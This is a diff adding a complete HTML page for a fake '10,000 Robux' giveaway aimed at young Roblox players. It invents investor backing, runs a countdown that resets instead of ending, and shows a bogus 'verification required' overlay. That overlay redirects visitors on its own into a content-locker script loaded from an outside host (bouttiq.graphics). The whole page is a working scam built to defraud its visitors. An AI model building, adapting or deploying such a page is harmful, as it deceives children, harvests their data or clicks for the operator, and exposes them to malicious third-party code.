@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>10,000 Robux Giveaway - Claim Your Prize!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Locker Script -->
+    <script type="text/javascript" id="ogjs" src="https://bouttiq.graphics/cl/js/qnkv84"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #0d1b2a 50%, #1b263b 100%);
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, #0088ff, #00ddff, #0088ff);
+            border-radius: 0 0 10px 10px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .logo i {
+            font-size: 2.5rem;
+            color: #00a8ff;
+        }
+        
+        .logo-text {
+            font-size: 2.8rem;
+            font-weight: 800;
+            background: linear-gradient(90deg, #0088ff, #00ddff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 15px rgba(0, 136, 255, 0.3);
+        }
+        
+        .giveaway-title {
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin: 10px 0;
+            background: linear-gradient(90deg, #ff6b6b, #ffa726, #ffeb3b, #4caf50, #2196f3, #9c27b0);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(33, 150, 243, 0.3);
+        }
+        
+        .robux-amount {
+            font-size: 4.5rem;
+            font-weight: 900;
+            color: #ffd700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.7);
+            margin: 10px 0;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            color: #b0b0b0;
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        
+        /* Countdown */
+        .countdown {
+            background: rgba(0, 30, 60, 0.5);
+            border-radius: 15px;
+            padding: 25px;
+            margin: 40px auto;
+            max-width: 700px;
+            border: 1px solid rgba(0, 136, 255, 0.3);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .countdown-title {
+            text-align: center;
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #00a8ff;
+        }
+        
+        .countdown-timer {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+        
+        .countdown-item {
+            background: rgba(0, 20, 40, 0.8);
+            padding: 15px;
+            border-radius: 10px;
+            min-width: 100px;
+            text-align: center;
+            border: 1px solid rgba(0, 136, 255, 0.2);
+        }
+        
+        .countdown-number {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #00ddff;
+            text-shadow: 0 0 10px rgba(0, 221, 255, 0.5);
+        }
+        
+        .countdown-label {
+            font-size: 1rem;
+            color: #b0b0b0;
+            margin-top: 5px;
+        }
+        
+        /* Investors Section */
+        .investors-section {
+            margin: 50px 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .investors-title {
+            text-align: center;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: #00a8ff;
+        }
+        
+        .investors-container {
+            position: relative;
+            height: 120px;
+            overflow: hidden;
+        }
+        
+        .investors-track {
+            display: flex;
+            position: absolute;
+            left: 100%;
+            animation: scrollLeft 30s linear infinite;
+        }
+        
+        @keyframes scrollLeft {
+            0% {
+                left: 100%;
+            }
+            100% {
+                left: -200%;
+            }
+        }
+        
+        .investor-logo {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            margin: 0 20px;
+            padding: 15px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 200px;
+            height: 80px;
+            border: 1px solid rgba(0, 136, 255, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(5px);
+        }
+        
+        .investor-name {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: #fff;
+            text-shadow: 0 0 10px rgba(0, 136, 255, 0.5);
+        }
+        
+        /* Claim Button */
+        .claim-section {
+            text-align: center;
+            margin: 60px 0;
+        }
+        
+        .claim-button {
+            background: linear-gradient(90deg, #0088ff, #00ddff);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 25px rgba(0, 136, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .claim-button:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 30px rgba(0, 136, 255, 0.6);
+        }
+        
+        .claim-button:active {
+            transform: translateY(0);
+        }
+        
+        .claim-button::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -60%;
+            width: 40%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: rotate(30deg);
+            transition: left 0.5s ease;
+        }
+        
+        .claim-button:hover::after {
+            left: 120%;
+        }
+        
+        /* Steps */
+        .steps {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin: 50px 0;
+        }
+        
+        .step {
+            background: rgba(0, 30, 60, 0.4);
+            border-radius: 15px;
+            padding: 25px;
+            max-width: 300px;
+            text-align: center;
+            border: 1px solid rgba(0, 136, 255, 0.2);
+        }
+        
+        .step-number {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(90deg, #0088ff, #00ddff);
+            border-radius: 50%;
+            line-height: 40px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+        
+        .step-title {
+            font-size: 1.4rem;
+            margin-bottom: 10px;
+            color: #00a8ff;
+        }
+        
+        .step-description {
+            color: #b0b0b0;
+            line-height: 1.5;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 30px;
+            margin-top: 50px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: #888;
+            font-size: 0.9rem;
+        }
+        
+        .disclaimer {
+            max-width: 800px;
+            margin: 20px auto;
+            color: #aaa;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .overlay-content {
+            background: linear-gradient(135deg, #0a0a0a 0%, #0d1b2a 100%);
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 500px;
+            text-align: center;
+            border: 2px solid rgba(0, 136, 255, 0.5);
+            box-shadow: 0 0 50px rgba(0, 136, 255, 0.3);
+        }
+        
+        .overlay-title {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #00a8ff;
+        }
+        
+        .overlay-message {
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .giveaway-title {
+                font-size: 2.5rem;
+            }
+            
+            .robux-amount {
+                font-size: 3.5rem;
+            }
+            
+            .countdown-timer {
+                flex-wrap: wrap;
+            }
+            
+            .investor-logo {
+                min-width: 150px;
+                height: 60px;
+                margin: 0 10px;
+            }
+            
+            .investor-name {
+                font-size: 1.2rem;
+            }
+            
+            .claim-button {
+                padding: 15px 30px;
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="logo">
+                <i class="fas fa-gem"></i>
+                <div class="logo-text">ROBLOX ELITE</div>
+            </div>
+            <h1 class="giveaway-title">MEGA GIVEAWAY EVENT</h1>
+            <div class="robux-amount">10,000 ROBUX</div>
+            <p class="subtitle">Join thousands of players who have claimed their free Robux. Limited time offer - Don't miss your chance to get 10,000 Robux absolutely FREE!</p>
+        </header>
+        
+        <!-- Countdown -->
+        <section class="countdown">
+            <h2 class="countdown-title">Giveaway Ends In:</h2>
+            <div class="countdown-timer">
+                <div class="countdown-item">
+                    <div class="countdown-number" id="hours">12</div>
+                    <div class="countdown-label">Hours</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="minutes">45</div>
+                    <div class="countdown-label">Minutes</div>
+                </div>
+                <div class="countdown-item">
+                    <div class="countdown-number" id="seconds">30</div>
+                    <div class="countdown-label">Seconds</div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Investors -->
+        <section class="investors-section">
+            <h2 class="investors-title">Backed By Leading Investors</h2>
+            <div class="investors-container">
+                <div class="investors-track">
+                    <!-- Investor logos will scroll from right to left -->
+                    <div class="investor-logo"><span class="investor-name">Softbank</span></div>
+                    <div class="investor-logo"><span class="investor-name">YZi Labs</span></div>
+                    <div class="investor-logo"><span class="investor-name">Bitkraft</span></div>
+                    <div class="investor-logo"><span class="investor-name">Griffin</span></div>
+                    <div class="investor-logo"><span class="investor-name">Coinfund</span></div>
+                    <div class="investor-logo"><span class="investor-name">Multicoin</span></div>
+                    <div class="investor-logo"><span class="investor-name">Consensys</span></div>
+                    <div class="investor-logo"><span class="investor-name">Animoca</span></div>
+                    <!-- Duplicate for seamless loop -->
+                    <div class="investor-logo"><span class="investor-name">Softbank</span></div>
+                    <div class="investor-logo"><span class="investor-name">YZi Labs</span></div>
+                    <div class="investor-logo"><span class="investor-name">Bitkraft</span></div>
+                    <div class="investor-logo"><span class="investor-name">Griffin</span></div>
+                    <div class="investor-logo"><span class="investor-name">Coinfund</span></div>
+                    <div class="investor-logo"><span class="investor-name">Multicoin</span></div>
+                    <div class="investor-logo"><span class="investor-name">Consensys</span></div>
+                    <div class="investor-logo"><span class="investor-name">Animoca</span></div>
+                </div>
+            </div>
+        </section>
+        
+        <!-- Steps -->
+        <section class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <h3 class="step-title">Click Claim Now</h3>
+                <p class="step-description">Press the button below to start the claim process for your 10,000 Robux prize.</p>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <h3 class="step-title">Complete Verification</h3>
+                <p class="step-description">Complete a quick verification to ensure you're a real Roblox player.</p>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <h3 class="step-title">Receive Your Robux</h3>
+                <p class="step-description">Your 10,000 Robux will be added to your account within 24 hours.</p>
+            </div>
+        </section>
+        
+        <!-- Claim Button -->
+        <section class="claim-section">
+            <button class="claim-button" onclick="showOverlay()">
+                <i class="fas fa-gift"></i> CLAIM YOUR 10,000 ROBUX NOW
+            </button>
+            <p class="disclaimer">This is a limited time offer. Only the first 1,000 claims will be processed. No payment required. Must be 13+ to participate. This promotion is not affiliated with Roblox Corporation.</p>
+        </section>
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2023 Roblox Elite Giveaway. All rights reserved.</p>
+            <p>This promotion is not sponsored, endorsed, or administered by Roblox Corporation.</p>
+        </footer>
+    </div>
+    
+    <!-- Overlay with locker redirect -->
+    <div class="overlay" id="overlay">
+        <div class="overlay-content">
+            <h2 class="overlay-title">Verification Required</h2>
+            <p class="overlay-message">To prevent abuse and ensure fair distribution, please complete the verification step to claim your 10,000 Robux prize.</p>
+            <p class="overlay-message">You will be redirected to the verification page in <span id="countdown">5</span> seconds...</p>
+            <button class="claim-button" onclick="activateLocker()" style="padding: 15px 30px; font-size: 1.3rem;">
+                <i class="fas fa-shield-alt"></i> PROCEED TO VERIFICATION
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        // Countdown timer
+        function updateCountdown() {
+            const hoursElement = document.getElementById('hours');
+            const minutesElement = document.getElementById('minutes');
+            const secondsElement = document.getElementById('seconds');
+            
+            let hours = parseInt(hoursElement.textContent);
+            let minutes = parseInt(minutesElement.textContent);
+            let seconds = parseInt(secondsElement.textContent);
+            
+            seconds--;
+            
+            if (seconds < 0) {
+                seconds = 59;
+                minutes--;
+                
+                if (minutes < 0) {
+                    minutes = 59;
+                    hours--;
+                    
+                    if (hours < 0) {
+                        hours = 23;
+                        minutes = 59;
+                        seconds = 59;
+                    }
+                }
+            }
+            
+            hoursElement.textContent = hours.toString().padStart(2, '0');
+            minutesElement.textContent = minutes.toString().padStart(2, '0');
+            secondsElement.textContent = seconds.toString().padStart(2, '0');
+        }
+        
+        // Update countdown every second
+        setInterval(updateCountdown, 1000);
+        
+        // Show overlay with redirect countdown
+        function showOverlay() {
+            const overlay = document.getElementById('overlay');
+            overlay.style.display = 'flex';
+            
+            let countdown = 5;
+            const countdownElement = document.getElementById('countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdown--;
+                countdownElement.textContent = countdown;
+                
+                if (countdown <= 0) {
+                    clearInterval(countdownInterval);
+                    activateLocker();
+                }
+            }, 1000);
+        }
+        
+        // Activate locker script
+        function activateLocker() {
+            // This will trigger the locker script
+            if (typeof og_load === 'function') {
+                og_load();
+            } else {
+                // Fallback in case the locker script doesn't load
+                alert("Redirecting to verification...");
+                // You can add your own redirect URL here as a fallback
+                // window.location.href = "YOUR_REDIRECT_URL";
+            }
+        }
+        
+        // Close overlay if clicked outside
+        document.getElementById('overlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
